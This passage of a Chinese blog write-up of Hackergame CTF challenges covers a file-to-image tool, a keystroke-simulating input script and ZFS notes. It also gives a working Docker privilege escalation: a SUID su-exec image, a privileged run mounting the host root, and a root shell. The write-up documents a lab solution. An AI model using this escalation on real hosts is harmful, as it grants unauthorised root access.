&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                ctx.<span class="title function_">putImageData</span>(imageData, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">                results.<span class="title function_">appendChild</span>(<span class="title function_">createImageCard</span>(canvas, i + <span class="number">1</span>, totalImages));</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;status&#x27;</span>).<span class="property">textContent</span> = <span class="string">`处理完成: 生成 <span class="subst">$&#123;totalImages&#125;</span> 张图片`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 创建图片卡片</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">createImageCard</span>(<span class="params">canvas, imageNum, totalImages</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            div.<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                &lt;h3&gt;图片 <span class="subst">$&#123;imageNum&#125;</span>/<span class="subst">$&#123;totalImages&#125;</span>&lt;/h3&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                &lt;button onclick=&quot;downloadCanvas(this.previousElementSibling, &#x27;binary_part<span class="subst">$&#123;imageNum&#125;</span>.png&#x27;)&quot;&gt;下载&lt;/button&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            `</span>;</span></span><br><span class="line"><span class="language-javascript">            div.<span class="title function_">insertBefore</span>(canvas, div.<span class="property">firstChild</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> div;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h3 id="浏览器自动输入"><a href="#浏览器自动输入" class="headerlink" title="浏览器自动输入"></a>浏览器自动输入</h3><p>由于只能通过键盘输入，而且有时间限制，故使用自动输入。console中使用如下代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取目标输入元素</span></span><br><span class="line"><span class="keyword">const</span> inputElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置输入内容</span></span><br><span class="line"><span class="keyword">const</span> htmlString = <span class="string">&#x27;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Binary File to Black-and-White Image&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input type=&quot;file&quot;id=&quot;fileInput&quot;onchange=&quot;processFile(this.files[0])&quot;&gt;&lt;div id=&quot;status&quot;&gt;Select a file to start conversion&lt;/div&gt;&lt;div id=&quot;results&quot;&gt;&lt;/div&gt;&lt;script&gt;function processFile(file)&#123;if(!file)return;document.getElementById(&quot;status&quot;).textContent=`Processing:$&#123;file.name&#125;`;const reader=new FileReader();reader.onload=function(e)&#123;const buffer=e.target.result;const bytes=new Uint8Array(buffer);convertToImages(bytes)&#125;;reader.readAsArrayBuffer(file)&#125;function convertToImages(bytes)&#123;const width=1024;const height=768;const bitsPerImage=width*height;const totalImages=Math.ceil(bytes.length*8/bitsPerImage);const results=document.getElementById(&quot;results&quot;);results.innerHTML=&quot;&quot;;for(let i=0;i&lt;totalImages;i++)&#123;const canvas=document.createElement(&quot;canvas&quot;);canvas.width=width;canvas.height=height;const ctx=canvas.getContext(&quot;2d&quot;);const imageData=ctx.createImageData(width,height);const data=imageData.data;let bitIndex=i*bitsPerImage;for(let pixel=0;pixel&lt;width*height&amp;&amp;bitIndex&lt;bytes.length*8;pixel++)&#123;const bytePos=Math.floor(bitIndex/8);const bitPos=bitIndex%8;const bitValue=(bytes[bytePos]&gt;&gt;(7-bitPos))&amp;1;const color=bitValue?0:255;const idx=pixel*4;data[idx]=color;data[idx+1]=color;data[idx+2]=color;data[idx+3]=255;bitIndex++&#125;ctx.putImageData(imageData,0,0);results.appendChild(createImageCard(canvas,i+1,totalImages))&#125;document.getElementById(&quot;status&quot;).textContent=`Conversion completed:$&#123;totalImages&#125;images generated`&#125;function createImageCard(canvas,imageNum,totalImages)&#123;const div=document.createElement(&quot;div&quot;);div.innerHTML=`&lt;h3&gt;Image $&#123;imageNum&#125;/$&#123;totalImages&#125;&lt;/h3&gt;&lt;button onclick=&quot;downloadCanvas(this.previousElementSibling, &quot;binary_part$&#123;imageNum&#125;.png&quot;)&quot;&gt;Download&lt;/button&gt;`;div.insertBefore(canvas,div.firstChild);return div&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逐个字符模拟键盘输入</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; htmlString.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> char = htmlString[i];</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置输入框的值（模拟每个字符的输入）</span></span><br><span class="line">  inputElement.<span class="property">value</span> += char;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 触发键盘事件（keydown、keypress、keyup）</span></span><br><span class="line">  <span class="keyword">const</span> eventInit = &#123;</span><br><span class="line">    <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cancelable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">key</span>: char,</span><br><span class="line">    <span class="attr">code</span>: char.<span class="title function_">charCodeAt</span>(<span class="number">0</span>).<span class="title function_">toString</span>(),</span><br><span class="line">    <span class="attr">which</span>: char.<span class="title function_">charCodeAt</span>(<span class="number">0</span>),</span><br><span class="line">    <span class="attr">keyCode</span>: char.<span class="title function_">charCodeAt</span>(<span class="number">0</span>),</span><br><span class="line">    <span class="attr">charCode</span>: char.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 触发keydown事件</span></span><br><span class="line">  <span class="keyword">const</span> keydownEvent = <span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">&#x27;keydown&#x27;</span>, eventInit);</span><br><span class="line">  inputElement.<span class="title function_">dispatchEvent</span>(keydownEvent);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 触发keypress事件</span></span><br><span class="line">  <span class="keyword">const</span> keypressEvent = <span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">&#x27;keypress&#x27;</span>, eventInit);</span><br><span class="line">  inputElement.<span class="title function_">dispatchEvent</span>(keypressEvent);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 触发keyup事件</span></span><br><span class="line">  <span class="keyword">const</span> keyupEvent = <span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">&#x27;keyup&#x27;</span>, eventInit);</span><br><span class="line">  inputElement.<span class="title function_">dispatchEvent</span>(keyupEvent);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 触发input事件（模拟真实输入）</span></span><br><span class="line">  <span class="keyword">const</span> inputEvent = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;input&#x27;</span>, &#123; <span class="attr">bubbles</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  inputElement.<span class="title function_">dispatchEvent</span>(inputEvent);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 添加延迟，模拟真实输入速度（可选）</span></span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解码部分"><a href="#解码部分" class="headerlink" title="解码部分"></a>解码部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">images_to_binary</span>(<span class="params">image_files, output_file, original_size=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将多个黑白图像文件按输入顺序转换回二进制文件</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">    image_files (list): 图像文件路径列表（按所需顺序排列）</span></span><br><span class="line"><span class="string">    output_file (str): 输出的二进制文件路径</span></span><br><span class="line"><span class="string">    original_size (int, optional): 原始文件大小（字节）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 存储所有位数据的列表</span></span><br><span class="line">    bit_data = []</span><br><span class="line">    </span><br><span class="line">    total_images = <span class="built_in">len</span>(image_files)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按用户提供的顺序处理图像文件</span></span><br><span class="line">    <span class="keyword">for</span> i, image_file <span class="keyword">in</span> <span class="built_in">enumerate</span>(image_files, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 打开图像</span></span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_file) <span class="keyword">as</span> img:</span><br><span class="line">                width, height = img.size</span><br><span class="line">                pixels = img.load()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 最后一张图片可能不完整，需要特殊处理</span></span><br><span class="line">                is_last_image = (i == total_images)</span><br><span class="line">                bits_per_image = width * height</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 遍历图像中的每个像素，提取位数据</span></span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                        pixel_index = y * width + x</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 如果是最后一张图片，且已知原始大小，则计算有效位</span></span><br><span class="line">                        <span class="keyword">if</span> is_last_image <span class="keyword">and</span> original_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            total_bits = original_size * <span class="number">8</span></span><br><span class="line">                            <span class="keyword">if</span> pixel_index &gt;= total_bits:</span><br><span class="line">                                <span class="keyword">break</span>  <span class="comment"># 超出有效位范围，停止处理</span></span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 获取像素值 (0=白色, 255=黑色)</span></span><br><span class="line">                        pixel = pixels[x, y]</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(pixel, <span class="built_in">tuple</span>):</span><br><span class="line">                            pixel = pixel[<span class="number">0</span>]</span><br><span class="line">                            </span><br><span class="line">                        <span class="comment"># 转换为位: 这里和编码逻辑要符合</span></span><br><span class="line">                        bit = <span class="number">1</span> <span class="keyword">if</span> pixel &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                        bit_data.append(bit)</span><br><span class="line">                        </span><br><span class="line">                    <span class="comment"># 最后一张图片的优化中断</span></span><br><span class="line">                    <span class="keyword">if</span> is_last_image <span class="keyword">and</span> original_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pixel_index &gt;= total_bits:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Processed image <span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;total_images&#125;</span>: <span class="subst">&#123;image_file&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;image_file&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果提供了原始大小，只保留有效位</span></span><br><span class="line">    <span class="keyword">if</span> original_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        total_bits = original_size * <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bit_data) &gt; total_bits:</span><br><span class="line">            bit_data = bit_data[:total_bits]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Trimmed excess bits: <span class="subst">&#123;<span class="built_in">len</span>(bit_data)&#125;</span> total bits kept&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将位数据转换为字节</span></span><br><span class="line">    byte_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bit_data), <span class="number">8</span>):</span><br><span class="line">        byte = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> i + j &lt; <span class="built_in">len</span>(bit_data):</span><br><span class="line">                byte = (byte &lt;&lt; <span class="number">1</span>) | bit_data[i + j]</span><br><span class="line">        byte_data.append(byte)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 写入二进制文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(byte_data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Successfully reconstructed file to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Original size: <span class="subst">&#123;original_size <span class="keyword">if</span> original_size <span class="keyword">else</span> <span class="string">&#x27;unknown&#x27;</span>&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Reconstructed size: <span class="subst">&#123;<span class="built_in">len</span>(byte_data)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Images used: <span class="subst">&#123;<span class="built_in">len</span>(image_files)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果提供了原始大小，检查还原是否完整</span></span><br><span class="line">    <span class="keyword">if</span> original_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">len</span>(byte_data) != original_size:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Warning: Reconstructed file size (<span class="subst">&#123;<span class="built_in">len</span>(byte_data)&#125;</span> bytes) does not match original size (<span class="subst">&#123;original_size&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    </span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Convert a series of black-and-white images back to the original binary file.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Output file name&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;Original file size in bytes (optional but recommended)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;images&#x27;</span>, nargs=<span class="string">&#x27;+&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;List of image files (PNG format)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查所有图像文件是否存在</span></span><br><span class="line">    missing_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> args.images <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(f)]</span><br><span class="line">    <span class="keyword">if</span> missing_files:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: The following files do not exist: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(missing_files)&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行转换</span></span><br><span class="line">    images_to_binary(args.images, args.output, args.size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="Docker-for-Everyone-Plus"><a href="#Docker-for-Everyone-Plus" class="headerlink" title="Docker for Everyone Plus"></a>Docker for Everyone Plus</h1><p>观察 <code>sudo -l</code> 的输出，发现 <code>user</code> 用户可以执行 <code>docker image load</code>，但 <code>docker run</code> 不能指定 <code>root</code> 用户</p>
<blockquote>
<ul>
<li>允许操作<ul>
<li>加载任意镜像（<code>docker image load</code>）</li>
<li>以 UID 1000 运行容器（<code>docker run -u 1000:1000</code>）</li>
</ul>
</li>
<li>禁止操作<ul>
<li>直接以 root 运行容器（<code>-u root</code> 被限制）</li>
</ul>
</li>
</ul>
</blockquote>
<p>由于构建docker镜像时，拥有该镜像的root权限，所以可以使用chmod+e，使用该命令对exec进行提权（root权限），然后使用exec开启新的shell，在该shell中的权限即为root权限，在该shell中访问挂载的根目录即可。</p>
<ol>
<li><strong>构建阶段特权</strong>：Dockerfile 执行时默认以 root 运行，可设置任意文件权限</li>
<li><strong>SUID 权限传递</strong>：通过 <code>chmod +s</code> 设置的权限会固化在镜像中</li>
<li><strong>运行时权限继承</strong>：即使容器以 UID 1000 运行，仍可执行已设 SUID 的程序</li>
</ol>
<p>构建恶意镜像：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:latest</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache su-exec      <span class="comment"># 1. 安装 su-exec 工具</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +s /sbin/su-exec          <span class="comment"># 2. 以 root 身份设置 SUID 权限</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建镜像</span></span><br><span class="line">docker build -t privesc-image .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出镜像为 tar 包</span></span><br><span class="line">docker save privesc-image &gt; privesc-image.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 ZModem 上传至目标服务器</span></span><br><span class="line">rz privesc-image.tar</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载镜像（利用 sudo 权限）</span></span><br><span class="line">sudo docker image load &lt; privesc-image.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行容器并挂载宿主机根目录</span></span><br><span class="line">sudo docker run --<span class="built_in">rm</span> -u 1000:1000 -it --privileged -v /:/host:ro privesc-image</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-u 1000:1000</code></td>
<td>符合 sudo 权限限制，以普通用户运行</td>
</tr>
<tr>
<td><code>--privileged</code></td>
<td>突破容器权限隔离，允许挂载宿主机设备</td>
</tr>
<tr>
<td><code>-v /:/host:ro</code></td>
<td>将宿主机根目录挂载到容器的 <code>/host</code></td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在容器内执行</span></span><br><span class="line"><span class="built_in">exec</span> su-exec root /bin/ash     <span class="comment"># 利用 SUID 权限获取 root shell</span></span><br><span class="line"><span class="built_in">cat</span> /host/flag      <span class="comment"># 读取宿主机根目录下的 flag</span></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>权限继承</strong>：<code>su-exec</code> 的 SUID 权限使普通用户（UID 1000）可临时获得 root 权限</li>
<li><strong>路径穿透</strong>：通过挂载的 <code>/host</code> 路径直接访问宿主机文件系统</li>
</ol>
<h1 id="看不见的彼方：交换空间"><a href="#看不见的彼方：交换空间" class="headerlink" title="看不见的彼方：交换空间"></a>看不见的彼方：交换空间</h1><p>题目要求两个程序将各子目录下的文件交换，并且有使用磁盘大小和内存大小的限制，解决办法是将文件切分，分批交换，可使用http协议或者使用共享内存和消息队列实现。</p>
<h1 id="ZFS-文件恢复"><a href="#ZFS-文件恢复" class="headerlink" title="ZFS 文件恢复"></a>ZFS 文件恢复</h1><p>涉及到ZFS的相关知识点，这里写一下粗略的理解</p>
<p>ZFS文件系统会将删除操作记为修改，类似于git中的历史版本记录，故可以通过查看对文件的修改记录，来获取删除的内容；</p>
<p>其中使用zdb命令来查看文件系统的相关信息：</p>
<p>步骤：</p>
<ol>
<li>获取删除队列</li>
<li>在删除队列中获取删除的文件denode number</li>
<li>读取相关文件信息</li>
</ol>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackergame/">hackergame</a></div><div class="post_share"><div class="social-share" data-image="/assets/img/tx.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/01/%E7%AC%94%E8%AE%B0/%E7%89%9B%E5%AE%A2%E7%BB%8F%E5%85%B8%E5%BF%85%E5%88%B7%E7%BC%96%E7%A8%8B%E9%A2%98%E5%BA%93/%E7%89%9B%E5%AE%A2%E7%BB%8F%E5%85%B8%E5%BF%85%E5%88%B7%E7%BC%96%E7%A8%8B%E9%A2%98%E5%BA%93/" title="牛客经典必刷编程题库"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">牛客经典必刷编程题库</div></div></a></div><div class="next-post pull-right"><a href="/2025/06/06/%E7%BB%8F%E9%AA%8C/MemoryAnalyzerTool/MemoryAnalyzerTool/" title="MemoryAnalyzerTool"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MemoryAnalyzerTool</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/assets/img/tx.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Boranget</div><div class="author-info__description">整理的一些笔记和平时的一些经验</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">191</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">198</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Boranget"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记分类是一些看书或者网课做的笔记，经验分类一般是平时碰到的问题或者折腾的一些小东西。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99"><span class="toc-number">1.</span> <span class="toc-text">相关资料</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E4%BA%BA%E8%A7%A3%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">本人解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">官方解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84-CTFer-%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80"><span class="toc-number">3.</span> <span class="toc-text">喜欢做签到的 CTFer 你们好呀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E8%A7%A3%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">个人解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 